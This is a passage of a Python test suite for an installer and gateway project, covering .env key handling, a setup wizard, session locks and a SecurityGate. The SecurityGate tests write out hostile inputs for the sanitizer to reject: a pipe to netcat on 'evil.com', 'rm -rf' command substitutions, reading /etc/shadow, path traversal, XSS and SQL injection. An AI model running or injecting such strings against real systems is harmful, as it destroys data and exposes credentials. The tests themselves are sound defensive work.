        assert "ThrottleInterval" in plist_xml

    def test_dmn21_plist_keepalive(self, tmp_path):
        """DMN-21: KeepAlive 設定"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        plist_xml = daemon.generate_plist(config)
        assert "KeepAlive" in plist_xml
        assert "SuccessfulExit" in plist_xml

    def test_dmn22_log_directory_created(self, tmp_path):
        """DMN-22: log 目錄自動建立"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        daemon.write_plist(config)
        assert config.log_dir.exists()

    @patch("museon.installer.daemon.subprocess.run")
    def test_dmn23_health_check_correct_port(self, mock_run):
        """DMN-23: 健康檢查使用正確 port"""
        mock_run.return_value = MagicMock(returncode=0, stdout="200")
        daemon = DaemonConfigurator()
        daemon.check_health_endpoint(port=9999)
        args = mock_run.call_args[0][0]
        assert "http://127.0.0.1:9999/health" in " ".join(args)

    def test_dmn24_plist_process_type(self, tmp_path):
        """DMN-24: ProcessType 為 Background"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        plist_xml = daemon.generate_plist(config)
        assert "Background" in plist_xml

    def test_dmn25_plist_path_contains_homebrew(self, tmp_path):
        """DMN-25: PATH 包含 /opt/homebrew/bin"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        plist_xml = daemon.generate_plist(config)
        assert "/opt/homebrew/bin" in plist_xml


# ═══════════════════════════════════════════════════════════════
# Section 5：API Key 設定 — ApiKeyConfigurator (25 tests)
# 模擬：不懂 API 的老闆、複製貼上帶空格、重複設定
# ═══════════════════════════════════════════════════════════════


class TestApiKeyConfigurator:
    """KEY-01 ~ KEY-25: API Key 設定邊界情況"""

    def test_key01_create_new_env(self, tmp_path):
        """KEY-01: 建立新 .env"""
        env_file = tmp_path / ".env"
        config = ApiKeyConfigurator()
        result = config.create_env_file(env_file)
        assert result.status == StepStatus.SUCCESS
        assert env_file.exists()

    def test_key02_create_env_existing_no_overwrite(self, tmp_path):
        """KEY-02: .env 已存在不覆蓋"""
        env_file = tmp_path / ".env"
        env_file.write_text("MY_KEY=existing\n")
        config = ApiKeyConfigurator()
        config.create_env_file(env_file)
        content = env_file.read_text()
        assert "MY_KEY=existing" in content

    def test_key03_write_new_key(self, tmp_path):
        """KEY-03: 寫入新 key"""
        env_file = tmp_path / ".env"
        env_file.write_text("# template\n")
        config = ApiKeyConfigurator()
        result = config.write_key(env_file, "ANTHROPIC_API_KEY", "sk-ant-api03-test")
        assert result.status == StepStatus.SUCCESS
        content = env_file.read_text()
        assert "ANTHROPIC_API_KEY=sk-ant-api03-test" in content

    def test_key04_update_existing_key(self, tmp_path):
        """KEY-04: 更新已存在的 key"""
        env_file = tmp_path / ".env"
        env_file.write_text("ANTHROPIC_API_KEY=old\n")
        config = ApiKeyConfigurator()
        config.write_key(env_file, "ANTHROPIC_API_KEY", "new")
        content = env_file.read_text()
        assert content.count("ANTHROPIC_API_KEY") == 1
        assert "ANTHROPIC_API_KEY=new" in content
        assert "old" not in content

    def test_key05_update_commented_key(self, tmp_path):
        """KEY-05: 更新被註解的 key"""
        env_file = tmp_path / ".env"
        env_file.write_text("# ANTHROPIC_API_KEY=placeholder\n")
        config = ApiKeyConfigurator()
        config.write_key(env_file, "ANTHROPIC_API_KEY", "real_value")
        content = env_file.read_text()
        assert "ANTHROPIC_API_KEY=real_value" in content
        assert "# ANTHROPIC_API_KEY" not in content

    def test_key06_has_key_exists(self, tmp_path):
        """KEY-06: has_key 檢查存在的 key"""
        env_file = tmp_path / ".env"
        env_file.write_text("TELEGRAM_BOT_TOKEN=123:abc\n")
        config = ApiKeyConfigurator()
        assert config.has_key(env_file, "TELEGRAM_BOT_TOKEN") is True

    def test_key07_has_key_missing(self, tmp_path):
        """KEY-07: has_key 檢查不存在的 key"""
        env_file = tmp_path / ".env"
        env_file.write_text("OTHER_KEY=value\n")
        config = ApiKeyConfigurator()
        assert config.has_key(env_file, "TELEGRAM_BOT_TOKEN") is False

    def test_key08_has_key_skips_comments(self, tmp_path):
        """KEY-08: has_key 跳過註解行"""
        env_file = tmp_path / ".env"
        env_file.write_text("# ANTHROPIC_API_KEY=placeholder\n")
        config = ApiKeyConfigurator()
        assert config.has_key(env_file, "ANTHROPIC_API_KEY") is False

    def test_key09_has_key_file_not_exists(self, tmp_path):
        """KEY-09: has_key 檔案不存在"""
        env_file = tmp_path / ".env"
        config = ApiKeyConfigurator()
        assert config.has_key(env_file, "ANY_KEY") is False

    def test_key10_write_key_creates_parent_dir(self, tmp_path):
        """KEY-10: write_key 不會自動建立父目錄（但可以寫入已存在的目錄）"""
        env_file = tmp_path / "subdir" / ".env"
        env_file.parent.mkdir(parents=True)
        config = ApiKeyConfigurator()
        result = config.write_key(env_file, "TEST_KEY", "value")
        assert result.status == StepStatus.SUCCESS

    def test_key11_env_template_contents(self):
        """KEY-11: ENV_TEMPLATE 包含必要佔位符"""
        template = ApiKeyConfigurator.ENV_TEMPLATE
        assert "ANTHROPIC_API_KEY" in template
        assert "TELEGRAM_BOT_TOKEN" in template

    def test_key12_write_key_preserves_others(self, tmp_path):
        """KEY-12: write_key 保持其他行不變"""
        env_file = tmp_path / ".env"
        env_file.write_text("LINE1=value1\nLINE2=value2\n")
        config = ApiKeyConfigurator()
        config.write_key(env_file, "LINE1", "new_value1")
        content = env_file.read_text()
        assert "LINE2=value2" in content

    def test_key13_env_with_empty_lines_and_comments(self, tmp_path):
        """KEY-13: .env 有空行和註解"""
        env_file = tmp_path / ".env"
        env_file.write_text("# comment\n\n# another\nKEY=val\n\n")
        config = ApiKeyConfigurator()
        config.write_key(env_file, "NEW_KEY", "new_val")
        content = env_file.read_text()
        assert "NEW_KEY=new_val" in content
        assert "# comment" in content

    def test_key14_value_with_equals_sign(self, tmp_path):
        """KEY-14: 值包含等號"""
        env_file = tmp_path / ".env"
        env_file.write_text("")
        config = ApiKeyConfigurator()
        config.write_key(env_file, "MY_KEY", "val=ue=here")
        content = env_file.read_text()
        assert "MY_KEY=val=ue=here" in content

    def test_key15_has_key_empty_value(self, tmp_path):
        """KEY-15: has_key 對空值 key"""
        env_file = tmp_path / ".env"
        env_file.write_text("ANTHROPIC_API_KEY=\n")
        config = ApiKeyConfigurator()
        assert config.has_key(env_file, "ANTHROPIC_API_KEY") is False

    def test_key16_write_key_returns_step_result(self, tmp_path):
        """KEY-16: write_key 回傳 StepResult"""
        env_file = tmp_path / ".env"
        env_file.write_text("")
        config = ApiKeyConfigurator()
        result = config.write_key(env_file, "KEY", "val")
        assert isinstance(result, StepResult)
        assert result.status == StepStatus.SUCCESS

    def test_key17_create_env_content(self, tmp_path):
        """KEY-17: 建立的 .env 包含模板內容"""
        env_file = tmp_path / ".env"
        config = ApiKeyConfigurator()
        config.create_env_file(env_file)
        content = env_file.read_text()
        assert "MUSEON" in content

    def test_key18_multiple_writes_same_key(self, tmp_path):
        """KEY-18: 多次寫入同一 key"""
        env_file = tmp_path / ".env"
        env_file.write_text("")
        config = ApiKeyConfigurator()
        config.write_key(env_file, "KEY", "v1")
        config.write_key(env_file, "KEY", "v2")
        config.write_key(env_file, "KEY", "v3")
        content = env_file.read_text()
        assert content.count("KEY=") == 1
        assert "KEY=v3" in content

    def test_key19_has_key_no_equals(self, tmp_path):
        """KEY-19: 只有 key 名沒有等號"""
        env_file = tmp_path / ".env"
        env_file.write_text("ANTHROPIC_API_KEY\n")
        config = ApiKeyConfigurator()
        assert config.has_key(env_file, "ANTHROPIC_API_KEY") is False

    def test_key20_write_key_readonly_file(self, tmp_path):
        """KEY-20: 檔案寫入權限問題"""
        env_file = tmp_path / ".env"
        env_file.write_text("content\n")
        env_file.chmod(0o444)
        config = ApiKeyConfigurator()
        result = config.write_key(env_file, "KEY", "val")
        assert result.status == StepStatus.FAILED
        # Restore permissions for cleanup
        env_file.chmod(0o644)

    def test_key21_crlf_handling(self, tmp_path):
        """KEY-21: CRLF 換行處理"""
        env_file = tmp_path / ".env"
        env_file.write_text("KEY1=val1\r\nKEY2=val2\r\n")
        config = ApiKeyConfigurator()
        config.write_key(env_file, "KEY1", "new_val1")
        content = env_file.read_text()
        assert "KEY1=new_val1" in content

    def test_key22_value_with_spaces(self, tmp_path):
        """KEY-22: 值前後有空格"""
        env_file = tmp_path / ".env"
        env_file.write_text("")
        config = ApiKeyConfigurator()
        config.write_key(env_file, "KEY", "  value_with_spaces  ")
        content = env_file.read_text()
        assert "KEY=  value_with_spaces  " in content

    def test_key23_value_with_quotes(self, tmp_path):
        """KEY-23: 值包含引號"""
        env_file = tmp_path / ".env"
        env_file.write_text("")
        config = ApiKeyConfigurator()
        config.write_key(env_file, "KEY", '"sk-ant-xxx"')
        content = env_file.read_text()
        assert 'KEY="sk-ant-xxx"' in content

    def test_key24_large_env_file(self, tmp_path):
        """KEY-24: .env 超過 100 行"""
        env_file = tmp_path / ".env"
        lines = [f"KEY_{i}=value_{i}" for i in range(150)]
        env_file.write_text("\n".join(lines) + "\n")
        config = ApiKeyConfigurator()
        config.write_key(env_file, "KEY_75", "updated")
        content = env_file.read_text()
        assert "KEY_75=updated" in content
        assert content.count("KEY_75=") == 1

    def test_key25_create_env_dir_not_exists(self, tmp_path):
        """KEY-25: .env 的父目錄不存在"""
        env_file = tmp_path / "nonexistent_dir" / ".env"
        config = ApiKeyConfigurator()
        result = config.create_env_file(env_file)
        assert result.status == StepStatus.FAILED


# ═══════════════════════════════════════════════════════════════
# Section 6：Setup Wizard — SetupManager (30 tests)
# 模擬：第一次開 Dashboard、重新設定、各種輸入錯誤
# ═══════════════════════════════════════════════════════════════


class TestSetupWizard:
    """WIZ-01 ~ WIZ-30: Setup Wizard 邊界情況"""

    def test_wiz01_first_run_no_env(self, tmp_path):
        """WIZ-01: .env 不存在 → True"""
        env_file = tmp_path / ".env"
        manager = SetupManager()
        assert manager.is_first_run(env_file) is True

    def test_wiz02_first_run_missing_marker(self, tmp_path):
        """WIZ-02: 有 key 但沒 MUSEON_SETUP_DONE → True"""
        env_file = tmp_path / ".env"
        env_file.write_text("ANTHROPIC_API_KEY=sk-ant-test\n")
        manager = SetupManager()
        assert manager.is_first_run(env_file) is True

    def test_wiz03_not_first_run(self, tmp_path):
        """WIZ-03: 有所有 key 和 SETUP_DONE=1 → False"""
        env_file = tmp_path / ".env"
        env_file.write_text(
            "ANTHROPIC_API_KEY=sk-ant-test\n"
            "TELEGRAM_BOT_TOKEN=123:abc\n"
            "MUSEON_SETUP_DONE=1\n"
        )
        manager = SetupManager()
        assert manager.is_first_run(env_file) is False

    def test_wiz04_setup_done_zero_semantic(self, tmp_path):
        """WIZ-04: SETUP_DONE=0 語義問題

        Bug 發現：has_key 對 "0" 回傳 True → is_first_run 回傳 False
        但語義上 0 不代表完成。這是一個需要注意的語義 gap。
        """
        env_file = tmp_path / ".env"
        env_file.write_text("MUSEON_SETUP_DONE=0\n")
        manager = SetupManager()
        # 當前實作：has_key("MUSEON_SETUP_DONE") 會對 "0" 回傳 True
        # 因為 "0".strip() 長度 > 0
        # 實際上 SETUP_DONE=0 不應該被視為完成
        result = manager.is_first_run(env_file)
        # 記錄行為：目前 has_key("MUSEON_SETUP_DONE") 對 "0" 回傳 True
        # is_first_run 會回傳 False — 這可能是非預期行為
        # 但我們先測試目前的實際行為
        assert result is False  # current behavior (known semantic issue)

    def test_wiz05_save_anthropic_key(self, tmp_path):
        """WIZ-05: 儲存 Anthropic key"""
        env_file = tmp_path / ".env"
        env_file.write_text("# template\n")
        manager = SetupManager()
        result = manager.save_api_key(env_file, "ANTHROPIC_API_KEY", "sk-ant-test")
        assert result.status == StepStatus.SUCCESS

    def test_wiz06_save_telegram_token(self, tmp_path):
        """WIZ-06: 儲存 Telegram token"""
        env_file = tmp_path / ".env"
        env_file.write_text("# template\n")
        manager = SetupManager()
        result = manager.save_api_key(env_file, "TELEGRAM_BOT_TOKEN", "123:abc")
        assert result.status == StepStatus.SUCCESS

    def test_wiz07_save_creates_env(self, tmp_path):
        """WIZ-07: .env 不存在時自動建立"""
        env_file = tmp_path / ".env"
        assert not env_file.exists()
        manager = SetupManager()
        manager.save_api_key(env_file, "KEY", "val")
        assert env_file.exists()

    def test_wiz08_validate_anthropic_valid(self):
        """WIZ-08: 有效 Anthropic key"""
        manager = SetupManager()
        valid, msg = manager.validate_anthropic_key("sk-ant-api03-validkey123")
        assert valid is True

    def test_wiz09_validate_anthropic_no_prefix(self):
        """WIZ-09: 無前綴"""
        manager = SetupManager()
        valid, msg = manager.validate_anthropic_key("invalid-key-without-prefix")
        assert valid is False
        assert "sk-ant" in msg

    def test_wiz10_validate_anthropic_too_short(self):
        """WIZ-10: 太短"""
        manager = SetupManager()
        valid, msg = manager.validate_anthropic_key("sk-ant-api03-x")
        assert valid is False
        assert "短" in msg

    def test_wiz11_validate_anthropic_empty(self):
        """WIZ-11: 空值"""
        manager = SetupManager()
        valid, msg = manager.validate_anthropic_key("")
        assert valid is False
        assert "空" in msg

    def test_wiz12_validate_telegram_valid(self):
        """WIZ-12: 有效 Telegram token"""
        manager = SetupManager()
        valid, msg = manager.validate_telegram_token("123456789:ABCdefGHIjklMNOpqrsTUV")
        assert valid is True

    def test_wiz13_validate_telegram_no_colon(self):
        """WIZ-13: 無冒號"""
        manager = SetupManager()
        valid, msg = manager.validate_telegram_token("no-colon-here")
        assert valid is False

    def test_wiz14_validate_telegram_non_numeric_prefix(self):
        """WIZ-14: 冒號前不是數字"""
        manager = SetupManager()
        valid, msg = manager.validate_telegram_token("abc:defghijk")
        assert valid is False

    def test_wiz15_validate_telegram_empty(self):
        """WIZ-15: 空值"""
        manager = SetupManager()
        valid, msg = manager.validate_telegram_token("")
        assert valid is False

    @patch("museon.gateway.setup_handlers.urllib.request.urlopen")
    def test_wiz16_anthropic_connection_success(self, mock_urlopen):
        """WIZ-16: Anthropic 連線成功"""
        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_resp.read.return_value = b'{"data":[]}'
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp
        manager = SetupManager()
        success, msg = manager.test_anthropic_connection("sk-ant-valid")
        assert success is True

    @patch("museon.gateway.setup_handlers.urllib.request.urlopen")
    def test_wiz17_anthropic_connection_401(self, mock_urlopen):
        """WIZ-17: Anthropic key 無效 401"""
        mock_urlopen.side_effect = urllib.error.HTTPError(
            url="test", code=401, msg="Unauthorized",
            hdrs=None, fp=None
        )
        manager = SetupManager()
        success, msg = manager.test_anthropic_connection("sk-ant-invalid")
        assert success is False
        assert "無效" in msg or "驗證失敗" in msg

    @patch("museon.gateway.setup_handlers.urllib.request.urlopen")
    def test_wiz18_anthropic_connection_timeout(self, mock_urlopen):
        """WIZ-18: Anthropic 連線超時"""
        mock_urlopen.side_effect = urllib.error.URLError("timeout")
        manager = SetupManager()
        success, msg = manager.test_anthropic_connection("sk-ant-valid")
        assert success is False
        assert "失敗" in msg

    @patch("museon.gateway.setup_handlers.urllib.request.urlopen")
    def test_wiz19_telegram_connection_success(self, mock_urlopen):
        """WIZ-19: Telegram 連線成功"""
        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_resp.read.return_value = json.dumps({
            "ok": True,
            "result": {"first_name": "TestBot", "username": "test_bot"}
        }).encode()
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp
        manager = SetupManager()
        success, msg = manager.test_telegram_connection("123:abc")
        assert success is True
        assert "test_bot" in msg or "TestBot" in msg

    @patch("museon.gateway.setup_handlers.urllib.request.urlopen")
    def test_wiz20_telegram_connection_401(self, mock_urlopen):
        """WIZ-20: Telegram token 無效"""
        mock_urlopen.side_effect = urllib.error.HTTPError(
            url="test", code=401, msg="Unauthorized",
            hdrs=None, fp=None
        )
        manager = SetupManager()
        success, msg = manager.test_telegram_connection("bad:token")
        assert success is False

    @patch("museon.gateway.setup_handlers.urllib.request.urlopen")
    def test_wiz21_telegram_connection_timeout(self, mock_urlopen):
        """WIZ-21: Telegram 連線超時"""
        mock_urlopen.side_effect = urllib.error.URLError("timeout")
        manager = SetupManager()
        success, msg = manager.test_telegram_connection("123:abc")
        assert success is False

    def test_wiz22_status_all_unconfigured(self, tmp_path):
        """WIZ-22: 全部未設定"""
        env_file = tmp_path / ".env"
        env_file.write_text("# empty\n")
        manager = SetupManager()
        status = manager.get_setup_status(env_file)
        assert status["ANTHROPIC_API_KEY"]["configured"] is False
        assert status["TELEGRAM_BOT_TOKEN"]["configured"] is False

    def test_wiz23_status_partial(self, tmp_path):
        """WIZ-23: 部分設定"""
        env_file = tmp_path / ".env"
        env_file.write_text("ANTHROPIC_API_KEY=sk-ant-test\n")
        manager = SetupManager()
        status = manager.get_setup_status(env_file)
        assert status["ANTHROPIC_API_KEY"]["configured"] is True
        assert status["TELEGRAM_BOT_TOKEN"]["configured"] is False

    def test_wiz24_status_masked_value(self, tmp_path):
        """WIZ-24: 值遮罩"""
        env_file = tmp_path / ".env"
        env_file.write_text("ANTHROPIC_API_KEY=sk-ant-api03-verylongsecretkey\n")
        manager = SetupManager()
        status = manager.get_setup_status(env_file)
        masked = status["ANTHROPIC_API_KEY"]["masked_value"]
        assert "verylongsecretkey" not in masked
        assert "***" in masked

    def test_wiz25_mask_short_value(self):
        """WIZ-25: 短值遮罩（<=8 字元）"""
        manager = SetupManager()
        masked = manager._mask_value("abcde")
        assert masked == "abc***"
        assert len(masked) == 6

    def test_wiz26_mask_long_value(self):
        """WIZ-26: 長值遮罩（>8 字元）"""
        manager = SetupManager()
        masked = manager._mask_value("1234567890abcdef")
        assert masked == "12345678***"

    def test_wiz27_mask_empty_value(self):
        """WIZ-27: 空值遮罩"""
        manager = SetupManager()
        assert manager._mask_value("") == ""

    def test_wiz28_mark_complete(self, tmp_path):
        """WIZ-28: 標記設定完成"""
        env_file = tmp_path / ".env"
        env_file.write_text("KEY=val\n")
        manager = SetupManager()
        manager.mark_setup_complete(env_file)
        content = env_file.read_text()
        assert "MUSEON_SETUP_DONE=1" in content

    def test_wiz29_required_keys(self):
        """WIZ-29: REQUIRED_KEYS 完整"""
        assert "ANTHROPIC_API_KEY" in SetupManager.REQUIRED_KEYS
        assert "TELEGRAM_BOT_TOKEN" in SetupManager.REQUIRED_KEYS

    @patch("museon.gateway.setup_handlers.urllib.request.urlopen")
    def test_wiz30_anthropic_500_error(self, mock_urlopen):
        """WIZ-30: Anthropic 回應 500"""
        mock_urlopen.side_effect = urllib.error.HTTPError(
            url="test", code=500, msg="Internal Server Error",
            hdrs=None, fp=None
        )
        manager = SetupManager()
        success, msg = manager.test_anthropic_connection("sk-ant-valid")
        assert success is False
        assert "500" in msg


# ═══════════════════════════════════════════════════════════════
# Section 7：安全性閘道 — SecurityGate (25 tests)
# 模擬：惡意使用者、注入攻擊、DDoS 嘗試
# ═══════════════════════════════════════════════════════════════


class TestSecurityGate:
    """SEC-01 ~ SEC-25: 安全性邊界情況"""

    def test_sec01_valid_hmac(self):
        """SEC-01: 有效 HMAC"""
        gate = SecurityGate(hmac_secret="test_secret")
        payload = b"test payload"
        sig = hmac_module.new(b"test_secret", payload, hashlib.sha256).hexdigest()
        assert gate.validate_hmac(payload, sig) is True

    def test_sec02_invalid_hmac(self):
        """SEC-02: 無效 HMAC"""
        gate = SecurityGate(hmac_secret="test_secret")
        assert gate.validate_hmac(b"payload", "invalid_signature") is False

    def test_sec03_empty_hmac(self):
        """SEC-03: 空 HMAC"""
        gate = SecurityGate()
        assert gate.validate_hmac(b"payload", "") is False

    def test_sec04_rate_limit_normal(self):
        """SEC-04: 正常請求通過"""
        gate = SecurityGate(rate_limit_per_minute=60)
        for _ in range(5):
            assert gate.check_rate_limit("user1") is True

    def test_sec05_rate_limit_exceeded(self):
        """SEC-05: 超過速率限制"""
        gate = SecurityGate(rate_limit_per_minute=5)
        for _ in range(5):
            gate.check_rate_limit("user1")
        assert gate.check_rate_limit("user1") is False

    def test_sec06_rate_limit_cleanup(self):
        """SEC-06: 舊紀錄清除"""
        gate = SecurityGate(rate_limit_per_minute=2)
        gate._rate_tracker["user1"] = [time.time() - 120]  # 2 min ago
        assert gate.check_rate_limit("user1") is True

    def test_sec07_rate_limit_independent_users(self):
        """SEC-07: 不同使用者獨立計算"""
        gate = SecurityGate(rate_limit_per_minute=1)
        assert gate.check_rate_limit("user_a") is True
        assert gate.check_rate_limit("user_b") is True

    def test_sec08_sanitize_command_substitution(self):
        """SEC-08: $() 命令替換"""
        gate = SecurityGate()
        with pytest.raises(ValueError):
            gate.sanitize_input("hello $(rm -rf /)")

    def test_sec09_sanitize_backtick(self):
        """SEC-09: 反引號命令"""
        gate = SecurityGate()
        with pytest.raises(ValueError):
            gate.sanitize_input("result: `whoami`")

    def test_sec10_sanitize_pipe_injection(self):
        """SEC-10: 管線注入"""
        gate = SecurityGate()
        with pytest.raises(ValueError):
            gate.sanitize_input("test | nc evil.com 1234")

    def test_sec11_sanitize_sql_injection(self):
        """SEC-11: SQL 注入"""
        gate = SecurityGate()
        with pytest.raises(ValueError):
            gate.sanitize_input("DROP TABLE users")

    def test_sec12_sanitize_xss_script(self):
        """SEC-12: XSS script 標籤"""
        gate = SecurityGate()
        with pytest.raises(ValueError):
            gate.sanitize_input("<script>alert(1)</script>")

    def test_sec13_sanitize_javascript_protocol(self):
        """SEC-13: javascript: 協議"""
        gate = SecurityGate()
        with pytest.raises(ValueError):
            gate.sanitize_input("javascript:alert(1)")

    def test_sec14_sanitize_path_traversal(self):
        """SEC-14: 路徑遍歷"""
        gate = SecurityGate()
        with pytest.raises(ValueError):
            gate.sanitize_input("../../etc/passwd")

    def test_sec15_sanitize_normal_text(self):
        """SEC-15: 正常文字通過"""
        gate = SecurityGate()
        result = gate.sanitize_input("Hello, how are you?")
        assert result == "Hello, how are you?"

    def test_sec16_sanitize_oversized_content(self):
        """SEC-16: 超大內容（>50KB）"""
        gate = SecurityGate()
        with pytest.raises(ValueError, match="too large"):
            gate.sanitize_input("x" * 50001)

    def test_sec17_sanitize_exact_limit(self):
        """SEC-17: 剛好 50KB"""
        gate = SecurityGate()
        content = "a" * 50000
        result = gate.sanitize_input(content)
        assert len(result) == 50000

    def test_sec18_validate_source_telegram(self):
        """SEC-18: telegram 來源"""
        gate = SecurityGate()
        assert gate.validate_source("telegram") is True

    def test_sec19_validate_source_webhook(self):
        """SEC-19: webhook 來源"""
        gate = SecurityGate()
        assert gate.validate_source("webhook") is True

    def test_sec20_validate_source_unknown(self):
        """SEC-20: 未知來源"""
        gate = SecurityGate()
        assert gate.validate_source("unknown") is False

    def test_sec21_hmac_constant_time(self):
        """SEC-21: HMAC 使用 constant-time 比較"""
        # 確認程式碼使用 hmac.compare_digest
        import inspect
        source = inspect.getsource(SecurityGate.validate_hmac)
        assert "compare_digest" in source

    def test_sec22_sanitize_semicolon_chaining(self):
        """SEC-22: 分號命令串接"""
        gate = SecurityGate()
        with pytest.raises(ValueError):
            gate.sanitize_input("; rm -rf /home")

    def test_sec23_sanitize_and_chaining(self):
        """SEC-23: && 命令串接"""
        gate = SecurityGate()
        with pytest.raises(ValueError):
            gate.sanitize_input("&& cat /etc/shadow")

    def test_sec24_validate_source_electron(self):
        """SEC-24: electron 來源"""
        gate = SecurityGate()
        assert gate.validate_source("electron") is True

    def test_sec25_validate_source_empty(self):
        """SEC-25: 空字串來源"""
        gate = SecurityGate()
        assert gate.validate_source("") is False


# ═══════════════════════════════════════════════════════════════
# Section 8：工作階段管理 — SessionManager (15 tests)
# 模擬：多使用者同時使用、長時間佔用、斷線重連
# ═══════════════════════════════════════════════════════════════


class TestSessionManager:
    """SES-01 ~ SES-15: 工作階段管理邊界情況"""

    @pytest.fixture
    def event_loop_policy(self):
        """Ensure each test gets a fresh event loop"""
        pass

    @pytest.mark.asyncio
    async def test_ses01_acquire_success(self):
        """SES-01: 取得鎖定成功"""
        manager = SessionManager()
        result = await manager.acquire("session1")
        assert result is True
        await manager.release("session1")

    @pytest.mark.asyncio
    async def test_ses02_acquire_already_locked(self):
        """SES-02: 鎖定已被佔用"""
        manager = SessionManager()
        await manager.acquire("user1")
        result = await manager.acquire("user1")
        assert result is False
        await manager.release("user1")

    @pytest.mark.asyncio
    async def test_ses03_release_then_reacquire(self):
        """SES-03: 釋放後重新取得"""
        manager = SessionManager()
        await manager.acquire("user1")
        await manager.release("user1")
        result = await manager.acquire("user1")
        assert result is True
        await manager.release("user1")

    @pytest.mark.asyncio
    async def test_ses04_is_processing_default(self):
        """SES-04: 未知 session 預設 False"""
        manager = SessionManager()
        assert manager.is_processing("unknown") is False

    @pytest.mark.asyncio
    async def test_ses05_is_processing_after_acquire(self):
        """SES-05: 取得鎖後 is_processing 為 True"""
        manager = SessionManager()
        await manager.acquire("user1")
        assert manager.is_processing("user1") is True
        await manager.release("user1")

    @pytest.mark.asyncio
    async def test_ses06_is_processing_after_release(self):
        """SES-06: 釋放後 is_processing 為 False"""
        manager = SessionManager()
        await manager.acquire("user1")
        await manager.release("user1")
        assert manager.is_processing("user1") is False

    @pytest.mark.asyncio
    async def test_ses07_wait_and_acquire_no_timeout(self):
        """SES-07: wait_and_acquire 無超時"""
        import sys
        if sys.version_info < (3, 11):
            pytest.skip("asyncio.timeout requires Python 3.11+")
        manager = SessionManager()
        result = await manager.wait_and_acquire("session1")
        assert result is True
        await manager.release("session1")

    @pytest.mark.asyncio
    async def test_ses08_wait_and_acquire_timeout(self):
        """SES-08: wait_and_acquire 超時"""
        import sys
        if sys.version_info < (3, 11):
            pytest.skip("asyncio.timeout requires Python 3.11+")
        manager = SessionManager()
        await manager.acquire("user1")
        result = await manager.wait_and_acquire("user1", timeout=0.1)
        assert result is False
        await manager.release("user1")

    @pytest.mark.asyncio
    async def test_ses09_different_sessions_independent(self):
        """SES-09: 不同 session 各自獨立"""
        manager = SessionManager()
        result_a = await manager.acquire("session_a")
        result_b = await manager.acquire("session_b")
        assert result_a is True
        assert result_b is True
        await manager.release("session_a")
        await manager.release("session_b")

    @pytest.mark.asyncio
    async def test_ses10_release_nonexistent(self):
        """SES-10: 釋放不存在的 session"""
        manager = SessionManager()
        # 不應拋出異常
        # 但如果 session 不在 _locks 中，release 不會做任何事
        await manager.release("nonexistent")

    @pytest.mark.asyncio
    async def test_ses11_double_release(self):
        """SES-11: 重複釋放"""
        manager = SessionManager()
        await manager.acquire("user1")
        await manager.release("user1")
        # 第二次釋放：lock 已釋放，再次 release 會拋 RuntimeError
        # 但這是一個已知的 edge case
        try:
            await manager.release("user1")
        except RuntimeError:
            pass  # expected: releasing unlocked lock

    @pytest.mark.asyncio
    async def test_ses12_lock_auto_creation(self):
        """SES-12: 鎖定物件自動建立"""
        manager = SessionManager()
        assert "new_session" not in manager._locks
        await manager.acquire("new_session")
        assert "new_session" in manager._locks
        await manager.release("new_session")

    @pytest.mark.asyncio
    async def test_ses13_multiple_sessions(self):
        """SES-13: 10 個不同 session 同時操作"""
        manager = SessionManager()
        sessions = [f"session_{i}" for i in range(10)]
        for sid in sessions:
            result = await manager.acquire(sid)
            assert result is True
        for sid in sessions:
            await manager.release(sid)

    @pytest.mark.asyncio
    async def test_ses14_wait_acquire_after_release(self):
        """SES-14: 鎖定釋放後 wait_and_acquire 成功"""
        import sys
        if sys.version_info < (3, 11):
            pytest.skip("asyncio.timeout requires Python 3.11+")
        manager = SessionManager()
        await manager.acquire("user1")

        async def release_later():
            await asyncio.sleep(0.05)
            await manager.release("user1")

        task = asyncio.create_task(release_later())
        result = await manager.wait_and_acquire("user1", timeout=1.0)
        assert result is True
        await task
        await manager.release("user1")

    @pytest.mark.asyncio
    async def test_ses15_empty_session_id(self):
        """SES-15: 空字串 session_id"""
        manager = SessionManager()
        result = await manager.acquire("")
        assert result is True
        await manager.release("")


# ═══════════════════════════════════════════════════════════════
# Section 9：安裝流程整合 — InstallerOrchestrator (25 tests)
# 模擬：完整安裝、中途失敗、部分跳過
# ═══════════════════════════════════════════════════════════════


class TestOrchestratorIntegration:
    """ORC-01 ~ ORC-25: 安裝流程整合邊界情況"""

    def _make_orchestrator(self, tmp_path, interactive=True):
        config = InstallConfig(install_dir=tmp_path)
        return InstallerOrchestrator(config=config, interactive=interactive)

    def test_orc01_ten_steps(self):
        """ORC-01: STEPS 有 10 個步驟（含權限檢查 + Claude Code）"""
        from museon.installer.orchestrator import InstallerOrchestrator
        assert len(InstallerOrchestrator.STEPS) == 10

    def test_orc02_step_labels_match(self):
        """ORC-02: 每個步驟都有對應標籤"""
        from museon.installer.orchestrator import InstallerOrchestrator
        for step in InstallerOrchestrator.STEPS:
            assert step in InstallerOrchestrator.STEP_LABELS

    def test_orc03_run_all_success(self, tmp_path):
        """ORC-03: 所有步驟都成功"""
        orch = self._make_orchestrator(tmp_path)
        success_result = StepResult(
            step_name="test", status=StepStatus.SUCCESS, message="ok"
        )
        for step in InstallerOrchestrator.STEPS:
            setattr(orch, step, lambda: success_result)
        results = orch.run()
        assert len(results) == 10
        assert all(r.status == StepStatus.SUCCESS for r in results)

    def test_orc04_run_stops_on_failed(self, tmp_path):
        """ORC-04: FAILED 時停止"""
        orch = self._make_orchestrator(tmp_path)
        call_count = 0

        def make_result():
            nonlocal call_count
            call_count += 1
            if call_count == 3:
                return StepResult(step_name="fail", status=StepStatus.FAILED, message="error")
            return StepResult(step_name="ok", status=StepStatus.SUCCESS, message="ok")

        for step in InstallerOrchestrator.STEPS:
            setattr(orch, step, make_result)
        results = orch.run()
        assert len(results) == 3
        assert results[-1].status == StepStatus.FAILED

    def test_orc05_run_continues_on_warning(self, tmp_path):
        """ORC-05: WARNING 時繼續"""
        orch = self._make_orchestrator(tmp_path)
        call_count = 0

        def make_result():
            nonlocal call_count
            call_count += 1
